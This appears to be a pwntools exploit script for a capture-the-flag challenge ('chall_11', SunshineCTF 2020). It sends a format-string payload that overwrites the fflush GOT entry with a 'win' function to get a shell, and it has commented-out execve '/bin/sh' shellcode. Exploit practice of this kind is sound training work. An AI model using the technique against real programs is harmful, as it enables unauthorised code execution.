#!/usr/bin/python3
from pwn import *
import monkeyhex
import re

context.log_level = 'debug'
context.terminal = ['termite', '-e']

# lib = ELF('/usr/lib/libc.so.6') if not args.REMOTE else ELF('')
binary = context.binary = ELF('chall_11')

def attach_gdb(p, commands=None):
    """Template to run gdb with predefined commands on a process."""
    val = """b *win
    b* fflush
    """ if commands is None else commands
    return gdb.attach(p, val)


def new_proc(start_gdb=False, val=None):
    """Start a new process with predefined debug operations"""
    p = process(binary.path)
    if start_gdb is True:
        attach_gdb(p, val)
    return p

def local_send_payload(payload):
    """Dummy function to get offsets etc"""
    log.info("payload = %s" % repr(payload))
    r = process(binary.path)
    # r = remote('chal.2020.sunshinectf.org', int('30011'))
    r.send(b'A'*0x13)
    r.sendline(payload)
    res = r.recv()
    r.close()
    return res



rexp = re.compile(b'0x[a-f0-9]+')
p = new_proc(False) if not args.REMOTE else remote('chal.2020.sunshinectf.org', int('30011'))
pause()


def real_send_payload(payload):
    """Dummy function to get offsets etc"""
    log.info("payload = %s" % repr(payload))
    p.send(b'A'*0x13)
    p.sendline(payload)
    p.sendline(b'sh')
    # res = p.recv()
    # return res

# format_string = FmtStr(execute_fmt=local_send_payload)


# format_string.execute_fmt = real_send_payload
real_send_payload( fmtstr_payload(6, {binary.sym['got.fflush']: binary.sym['win']}))

# format_string.write(binary.sym['fflush']+2, binary.sym['win'])
# format_string.execute_writes()

# payload = cyclic(100) + b'\n'
# payload = asm(shellcraft.execve(b'/bin/sh', 0, 0)) +b'\n'
# p.send(payload)

# do leak / payload gen here

# if args.DEBUG is True:
#     attach_gdb(p)
# p.sendline(payload)
# if args.DEBUG is True:
#     import ipdb as pdb; pdb.set_trace()

p.interactive()
